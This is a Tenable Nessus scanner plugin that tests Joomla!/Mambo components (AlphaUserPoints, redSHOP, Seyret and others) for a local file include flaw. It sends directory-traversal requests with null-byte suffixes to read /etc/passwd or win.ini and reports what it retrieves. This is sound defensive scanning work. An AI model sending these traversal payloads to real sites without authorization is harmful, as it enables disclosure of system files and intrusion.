#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(45490);
  script_version("$Revision: 1.26 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id(
    "CVE-2010-1313",
    "CVE-2010-1476",
    "CVE-2010-1531",
    "CVE-2010-1533",
    "CVE-2010-1535",
    "CVE-2010-1983",
    "CVE-2010-2128"
  );
  script_bugtraq_id(
    39206,
    39211,
    39237,
    39393,
    40187,
    41357
  );
  script_osvdb_id(
    63533,
    63535,
    63575,
    63642,
    63712,
    63715,
    64706
  );
  script_xref(name:"EDB-ID", value:"12054");
  script_xref(name:"EDB-ID", value:"12055");
  script_xref(name:"EDB-ID", value:"12082");
  script_xref(name:"EDB-ID", value:"12150");
  script_xref(name:"EDB-ID", value:"12607");
  script_xref(name:"EDB-ID", value:"14183");

  script_name(english:"Joomla! / Mambo Component 'view' Parameter Local File Include");
  script_summary(english:"Attempts to read a local file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
local file include vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host contains a component for Joomla! or Mambo that fails
to sanitize user-supplied input to the 'view' parameter in a GET
request before using it to include PHP code. Regardless of the PHP
'register_globals' setting, an unauthenticated, remote attacker can
exploit this issue to disclose arbitrary files or possibly execute
arbitrary PHP code on the remote host, subject to the privileges of
the web server user ID.");
  script_set_attribute(attribute:"solution", value:
"Contact the vendor of each affected component to see if an upgrade is
available or else disable it.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:U/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Joomla Component com_tweetla 1.0.1 LFI");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/04/04");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/04/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/04/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2017 Tenable Network Security, Inc.");

  script_dependencies("mambo_detect.nasl", "joomla_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);
app = "Mambo / Joomla!";

# Generate a list of paths to check.
mambo = get_dirs_from_kb(appname:'mambo_mos', port:port);
if (isnull(mambo)) mambo = make_list();

joomla = make_list();
joomla_installs = get_installs(
  app_name : "Joomla!",
  port     : port
);

if (joomla_installs[0] == IF_OK)
{
  foreach install (joomla_installs[1])
  {
    dir = install['path'];
    joomla = make_list(dir, joomla);
  }
}

dirs = make_list(mambo, joomla);
if (max_index(dirs) == 0)
  audit(AUDIT_WEB_APP_NOT_INST, app, port);

# Vulnerable components.
ncoms = 0;
com = make_array();
pat = make_array();                     # regexes so we're sure the component is installed.

# - AlphaUserPoints (Bugtraq 39393 / EDB-ID 12150)
com[ncoms] = "/index.php?option=com_alphauserpoints";
pat[ncoms] = "";
ncoms++;
# - JEQuoteForm (Bugtraq 40187 / EDB-ID 12607)
com[ncoms] = "/index.php?option=com_jequoteform";
pat[ncoms] = 'function submitbutton\\(';
ncoms++;
# - redSHOP (Bugtraq 39206 / EDB-ID 12054)
#   untested but confirmed at <http://redcomponent.com/forum/61-main/6890-redshop-1010-redprodctfinder-reddesign-release>.
com[ncoms] = "/index.php?option=com_redshop";
pat[ncoms] = '';
ncoms++;
# - redTWITTER (Bugtraq 39211 / EDB-ID 12055)
com[ncoms] = "/index.php?option=com_redtwitter";
pat[ncoms] = '(twitter_followers|twitters_list)';
ncoms++;
# - Seber Cart (Bugtraq 39237 / EDB-ID 12082)
com[ncoms] = "/index.php?option=com_sebercart";
#   nb: this appears in the Location header.
pat[ncoms] = 'view=store';
ncoms++;
# - Seyret (EDB-ID 14183)
com[ncoms] = "/index.php?option=com_seyret";
pat[ncoms] = 'com_seyret/(mootools\\.js|controllers/main\\.controller\\.php)';
ncoms++;


# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('/windows/win.ini','/winnt/win.ini');
  else
    files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini', 'LICENSE.php');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['LICENSE.php'] = "GNU GENERAL PUBLIC LICENSE";

# Loop through each directory.
contents = "";
found_file = "";
info = "";
non_affect = make_list();

foreach dir (list_uniq(dirs))
{
  for (i=0; i<ncoms; i++)
  {
    foreach file (files)
    {
      # Once we find a file that works, stick with it for any subsequent tests.
      if (found_file && file != found_file) continue;

      if (file[0] == '/') traversal = crap(data:"../", length:3*9) + '..';
      else traversal = '../../../';
      traversal = '/' + traversal;

      if (substr(file, strlen(file)-4) == ".php")
        exploit = traversal + substr(file, 0, strlen(file)-4-1);
      else
        exploit = traversal + file + "%00";

      url = dir + com[i] + "&view=" + exploit;
      res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);

      # There's a problem if...
      body = res[2];
      file_pat = file_pats[file];
      if (
        # we see the expected contents or...
        egrep(pattern:file_pat, string:body) ||
        # we get an error because magic_quotes was enabled or...
        traversal+file+".php" >< body ||
        # we get an error claiming the file doesn't exist or...
        file+"): failed to open stream: No such file" >< body ||
        file+") [function.require-once]: failed to open stream: No such file" >< body ||
        file+") [<a href='function.require-once'>function.require-once</a>]: failed to open stream: No such file" >< body ||
        # we get an error about open_basedir restriction.
        file+") [function.require-once]: failed to open stream: Operation not permitted" >< body ||
        file+") [<a href='function.require-once'>function.require-once</a>]: failed to open stream: Operation not permitted" >< body ||
        "open_basedir restriction in effect. File("+traversal+file >< body
      )
      {
        # Make sure it's the affected component unless we're paranoid or we can't.
        if (report_paranoia < 2 && pat[i])
        {
          url2 = dir + com[i];
          res2 = http_send_recv3(port:port, method:"GET", item:url2, exit_on_fail:TRUE);

          if (!egrep(pattern:pat[i], string:res2[1]+res2[2])) break;
        }

        info += "  - " + build_url(port:port, qs:url) + '\n';

        if (!contents && egrep(pattern:file_pat, string:body))
        {
          found_file = file;

          if ("sebercart" >< com[i])
          {
            contents = strstr(body, '<table class="nopad"');
            contents = contents - strstr(contents, '<link href');
            contents = ereg_replace(pattern:'^.+<td>[ \\t\\n\\r]*', replace:'', string:contents);
          }
          else
          {
            contents = body;
            if ("<br" >< contents) contents = contents - strstr(contents, "<br");
          }
        }
        break;
      }
    }
    if (info && !thorough_tests) break;
  }
  non_affect = make_list(non_affect, dir);
  if (info && !thorough_tests) break;
}

if (!info)
{
  installs = max_index(non_affect);

  if (installs == 0)
    exit(0, "None of the "+app+ " installs (" + join(dirs, sep:" & ") + ") on port " + port+ " are affected.");

  else if (installs == 1)
    audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:dir, port:port));

  else exit(0, "None of the "+app+ " installs (" + join(non_affect, sep:" & ") + ") on port " + port + " are affected.");
}

# Report findings.
if (os && "Windows" >< os) found_file = str_replace(find:'/', replace:'\\', string:found_file);

if (empty_or_null(contents)) contents = body;

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  file        : found_file,
  request     : split(info),
  output      : contents,
  attach_type : 'text/plain'
);
exit(0);
